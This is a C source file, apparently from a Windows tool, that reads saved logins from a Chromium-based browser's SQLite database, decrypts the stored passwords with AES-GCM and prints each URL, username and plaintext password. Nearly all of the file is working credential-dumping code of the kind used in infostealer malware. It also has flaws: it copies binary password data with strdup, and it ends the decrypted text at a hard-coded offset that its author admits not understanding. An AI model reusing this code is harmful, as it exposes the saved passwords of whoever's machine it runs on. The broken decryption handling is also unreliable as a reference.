// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include "logins.h"

#include <dpapi.h>
#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "aes.h"
#include "sqlite3.h"

// Taken from chromium doc:
// https://source.chromium.org/chromium/chromium/src/+/main:components/os_crypt/sync/os_crypt_win.cc;l=41-42;drc=27d34700b83f381c62e3a348de2e6dfdc08364b8
#define NONCE_LENGTH 12

// "v10" is prefixed to the key
#define ENCRYPTION_VERSION_PREFIX_LENGTH 3

// Retrieves "url login and password" from a **chromium based browser** sqlite
// database.
// Returns an array of `Login` of size `loginCountOunt` the `password`
// NOTE: Must be ran while the browser is NOT started otherwise the database is
// locked by the browser
// NOTE: `loginsOut` must be freed by the caller using `free_logins`
int chrmm_retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                          Login *loginsOut[]) {
  // In case of early return
  *loginsOut = NULL;
  *loginCountOut = 0;

  sqlite3 *db;
  int rc = sqlite3_open16(fullPath, &db);
  if (rc) {
    fprintf(stderr, "Can't open database: %s", sqlite3_errmsg(db));
    return EXIT_FAILURE;
  }

  // I think it's the same for every chromium browsers though I haven't checked
  const char *query =
      "SELECT origin_url, username_value, password_value FROM logins;";
  sqlite3_stmt *statement;
  rc = sqlite3_prepare_v2(db, query, -1, &statement, 0);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to execute statement: %s", sqlite3_errmsg(db));
    sqlite3_close(db);
    *loginsOut = NULL;
    *loginCountOut = 0;
    return EXIT_FAILURE;
  }

  int capacity = 10;   // size of the **allocated** array
  *loginCountOut = 0;  // real size (number of elements) of the array
  *loginsOut = (Login *)malloc(capacity * sizeof(Login));

  if (!*loginsOut) {
    fprintf(stderr, "Failed to allocate memory for LoginInfo");
    sqlite3_finalize(statement);
    sqlite3_close_v2(db);
    return EXIT_FAILURE;
  }

  // go over each row and grow our `loginsOut` accordingly
  while ((rc = sqlite3_step(statement)) == SQLITE_ROW) {
    if (*loginCountOut >= capacity) {
      capacity += 10;  // grow the allocated array by this much
      *loginsOut = (Login *)realloc(*loginsOut, capacity * sizeof(Login));
      if (!*loginsOut) {
        fprintf(stderr, "Failed to reallocate memory for LoginInfo");
        sqlite3_finalize(statement);
        sqlite3_close_v2(db);
        return EXIT_FAILURE;
      }
    }

    const unsigned char *url = sqlite3_column_text(statement, 0);
    const unsigned char *username = sqlite3_column_text(statement, 1);
    const unsigned char *passwordBlock = sqlite3_column_text(statement, 2);
    const int passwordBlockSize = sqlite3_column_bytes(statement, 2);

    (*loginsOut)[*loginCountOut].url = strdup((const char *)url);
    (*loginsOut)[*loginCountOut].username = strdup((const char *)username);
    (*loginsOut)[*loginCountOut].passwordBlock =
        strdup((const char *)passwordBlock);
    (*loginsOut)[*loginCountOut].passwordBlockSize = passwordBlockSize;

    (*loginCountOut)++;
  }

  rc = sqlite3_finalize(statement);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to finalize statement: %s\n", sqlite3_errmsg(db));
    sqlite3_close(db);
    return EXIT_FAILURE;
  }

  rc = sqlite3_close_v2(db);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to close database: %s\n", sqlite3_errmsg(db));
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

// Decrypts an array of `logins` of size `loginCount` by using the `key`
// decrypt passwords using [AES 256
// GCM](https://source.chromium.org/chromium/chromium/src/+/main:components/os_crypt/sync/os_crypt_win.cc;l=216-235)
// NOTE: `credentialsOut` must be freed with `free_credentials` by the caller
int chrmm_decrypt_logins(Login logins[], int loginCount, const BYTE *key,
                   Credential *credentialsOut[], int *credentialCountOut) {
  *credentialsOut = (Credential *)malloc(loginCount * sizeof(Credential));
  if (*credentialsOut == NULL) {
    fprintf(stderr, "Memory allocation failed\n");
    return EXIT_FAILURE;
  }

  for (int i = 0; i < loginCount; i++) {
    // cipher format: | "v10"(3) | nonce(12) | cipher(?) |
    BYTE *passwordBlock = (BYTE *)logins[i].passwordBlock;
    size_t passwordBlockSize = logins[i].passwordBlockSize;
    BYTE *nonce = passwordBlock + ENCRYPTION_VERSION_PREFIX_LENGTH;
    BYTE *ciphertext =
        passwordBlock + ENCRYPTION_VERSION_PREFIX_LENGTH + NONCE_LENGTH;
    size_t ciphertextSize =
        passwordBlockSize - (ENCRYPTION_VERSION_PREFIX_LENGTH + NONCE_LENGTH);

    BYTE *plaintext = (BYTE *)malloc(ciphertextSize);
    if (plaintext == NULL) {
      fprintf(stderr, "Memory allocation failed\n");
      free(*credentialsOut);
      return EXIT_FAILURE;
    }

    if (AES_GCM_decrypt(key, nonce, ciphertext, ciphertextSize, NULL, 0, 0,
                        plaintext)) {
      fprintf(stderr, "Decryption failed\n");
      free(plaintext);
      free(*credentialsOut);
      return EXIT_FAILURE;
    }

    // Don't now why but this seems to work as longs as there is no
    // authentication tag. Chromium real calculation is done here:
    // https://source.chromium.org/chromium/chromium/src/+/main:third_party/boringssl/src/crypto/fipsmodule/cipher/aead.cc.inc;l=192-228;drc=27d34700b83f381c62e3a348de2e6dfdc08364b8;bpv=1;bpt=1
    plaintext[ciphertextSize - (12 + 5 - 1)] = '\0';

    (*credentialsOut)[i].url = strdup(logins[i].url);
    (*credentialsOut)[i].username = strdup(logins[i].username);
    (*credentialsOut)[i].password = strdup((const char *)plaintext);

    free(plaintext);
  }

  *credentialCountOut = loginCount;
  return EXIT_SUCCESS;
}

// Frees an array of Login instance created by `chrmm_retrieve_logins`
void free_logins(Login logins[], int count) {
  for (int i = 0; i < count; i++) {
    free(logins[i].url);
    free(logins[i].username);
    free(logins[i].passwordBlock);
  }
  free(logins);
}

// Frees an array of `Credential`
void free_credentials(Credential credentials[], int count) {
  for (int i = 0; i < count; i++) {
    free(credentials[i].url);
    free(credentials[i].username);
    free(credentials[i].password);
  }
  free(credentials);
}

// Pretty print a `Login` struct
void printLogin(Login login) {
  printf("URL: %s\n", login.url);
  printf("Username: %s\n", login.username);
  printf("Password Block (Hex): ");
  for (int i = 0; i < login.passwordBlockSize; i++) {
    printf("%02X", (unsigned char)login.passwordBlock[i]);
  }
  printf("\n");
}

// Pretty print a `Credential` struct
void printCredential(Credential credential) {
  printf("URL: %s\n", credential.url);
  printf("Username: %s\n", credential.username);
  printf("Password: %s\n", credential.password);
}
